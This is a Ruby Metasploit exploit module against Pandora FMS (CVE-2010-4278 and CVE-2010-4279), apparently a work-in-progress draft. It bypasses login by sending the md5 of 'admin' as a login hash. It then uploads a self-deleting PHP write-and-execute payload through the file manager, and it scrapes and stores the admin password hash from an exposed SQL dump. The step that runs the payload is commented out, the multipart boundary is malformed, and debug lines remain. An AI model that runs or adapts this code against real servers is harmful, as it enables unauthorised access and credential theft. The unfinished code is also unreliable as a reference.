require 'msf/core'
 
 
class Metasploit3 < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
        include Msf::Exploit::Remote::HttpClient
        include Msf::Exploit::PhpEXE
 
        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Pandora FMS Command Injection',
                        'Description'    => %q{
                                        This module exploits two bugs. The first is an authentication
                                        due to flawed logic. The second is a command injection in the
                                        "networkmap" feature.
 
                                        The vulnerable code calls stripslashes() and htmlentities() on
                                        the injectable parameter, as well as mangling backslashes. It
                                        then attempts to use it as a filename before reaching the call
                                        to system(). Thus our command cannot have any quotes, slashes,
                                        or backslashes, and must be less than 255 after being
                                        concatenated with various hardcoded and configurable strings.
                                        To get around these restrictions, this module simply echo's a
                                        small chunk of php code to a file and achieves code execution
                                        by requesting that file as with an arbitrary file upload
                                        vulnerability.
                                },
                        'Author'         =>
                                [
                                        'Juan Galiana Lara', # Vulnerability discovery and PoC
                                        'egypt' # Metasploit module
                                ],
                        'License'        => MSF_LICENSE,
                        'References'     =>
                                [
                                        [ 'CVE',   '2010-4278' ], # Command injection
                                        [ 'OSVDB', '69549'     ], # Command injection
                                        [ 'URL',   'http://www.exploit-db.com/exploits/15639/' ], # Command injection
                                        [ 'CVE',   '2010-4279' ], # Auth bypass
                                        [ 'OSVDB', '69550'     ], # Auth bypass
                                        [ 'URL',   'http://www.exploit-db.com/exploits/15640/' ], # Auth bypass
                                ],
                        # Sent in an HTTP header, so can't have newlines
                        # A command payload would be more like "\x22\x27\x2f\x5c"
                        #'Payload' => { 'BadChars' => "\x0d\x0a" },
                        'Privileged'     => false,
                        'Platform'       => [ 'linux', 'php' ],
                        'Arch'           => [ ARCH_PHP, ARCH_X86, ARCH_X86_64 ],
                        'Targets'        => [
                                        [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
                                        [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
                        ],
                        'DisclosureDate' => 'Nov 30 2010',
                        'DefaultTarget'  => 0))
 
                register_options(
                        [
                                OptString.new('TARGETURI', [true, "The URI path of the Pandora FMS console page", "/pandora_console/"])
                        ], self.class)
        end
 
        def check
                res = login
                # Looking for a string in the successfully logged in page
                if res && res.body.index("user_edit")
                        print_good("Logged in as admin")
                        return Exploit::CheckCode::Vulnerable
                end
                return Exploit::CheckCode::Unknown
        end
 
        def exploit
                res = login
 
                unless res && res.body.index("user_edit")
                  print_error("Authentication bypass failed, is target vulnerable?")
                  return
                end
 
                print_good("Logged in as admin")
 
                # Will be something like:
                #   PHPSESSID=j7f167s4g8doisd9k0mavgri85; path=/
                @cookie = res.headers['Set-Cookie'].split(";").first
 
                # Pick a random filename to upload
                @payload_filename = "upload#{rand_text_alphanumeric(4)}.php"
#                @payload_filename = "evil3.php"
                @payload_dir = "images"
 
                # Upload php file using file manager
                print_status("Uploading #{@payload_filename} to the #{@payload_dir} directory")
                upload
 
                @db_file = "pandoradb_data.sql"
                print_status("Swiping password hash from #{@db_file}")
                getpass

                # Request the payload. Don't need the cookie, because the payload
                # doesn't care about our session with the app.
                print_status("Attempting to run #{@payload_filename}...")
#                res = send_request_cgi({
#                  'uri' => normalize_uri(target_uri.to_s, "#{@payload_dir}/#{@payload_filename}"),
#                })
#                handler
        end


        def getpass
          # Password hash is stored inside of /var/www/pandora_console/pandoradb_data.sql
          res = send_request_cgi({
            'method'  => 'GET',
            'uri'     => "/pandora_console/#{@db_file}",
            'cookie'  => @cookie,
          })
          res.body.lines.each do |line|
            if( line =~ /Admin Pandora/i )
              arr = line.split("', '")
              arr[0] = arr[0][2..-1]
              loot_path = store_loot( "pandora.admin.hash", "text/plain", arr[5], nil )
              print_good("User and hash stored in: #{loot_path.to_s}")
              p arr
            end
          end
          # DB insert command to create the user
# ('admin', 'Pandora', 'Pandora', 'Admin', '', '1da7ee7d45b96d0e1f45ee4ee23da560', 'Admin Pandora', 1232642121, 0, 'admin@example.com', '555-555-5555', 1);
          # Turns out the hash decrypts as 'pandora'
#           
        end
 
        # Log in and grab the cookie
        def login
          res = send_request_cgi({
            'uri'      => normalize_uri("#{target_uri.to_s}"),
            'vars_get' => {
              'loginhash_data' => '21232f297a57a5a743894a0e4a801fc3', # md5 of "admin"
              'loginhash_user' => 'admin', 'loginhash' => '1',
            },
          })
        return res
        rescue ::Rex::ConnectionError
                return nil
        end
 
 
        def upload()
# http://www.exploit-db.com/exploits/20173/
          # Boundary between MIME objects
          boundary = "---------------------------#{rand_text_alphanumeric(10)}"
          # Build the MIME multipart upload data
          updata  = "--#{boundary}\r\n"
          updata << "Content-Disposition: form-data; name=\"file\"; filename=\"#{@payload_filename}\"\r\n"
          updata << "Content-Type: application/octet-stream\r\n"
          updata << "\r\n"
          updata << "#{get_write_exec_payload(:unlink_self=>true)}"
          updata << "\r\n"
          updata << "--#{boundary}\r\n"
          updata << "Content-Disposition: form-data; name=\"go\"\r\n"
          updata << "\r\nGo\r\n"
          updata << "--#{boundary}\r\n"
          updata << "Content-Disposition: form-data; name=\"directory\"\r\n"
          updata << "\r\n#{@payload_dir}\r\n"
          updata << "--#{boundary}\r\n"
          updata << "Content-Disposition: form-data; name=\"upload_file\"\r\n"
          updata << "\r\n1\r\n"
          updata << "#{boundary}\r\n"

          # Push up the request for upload
          res = send_request_cgi({
            'method'  => 'POST',
            'uri'     => "/pandora_console/index.php",
            'vars_get' => {
                    'sec' => 'gsetup', 'sec2' => 'godmode/setup/file_manager',
            },
            'ctype'   => "multipart/form-data; boundary=#{boundary}",
            'data'    => updata,
            'cookie'  => @cookie,
          })

          return res
        rescue ::Rex::ConnectionError
                return nil
        end
end

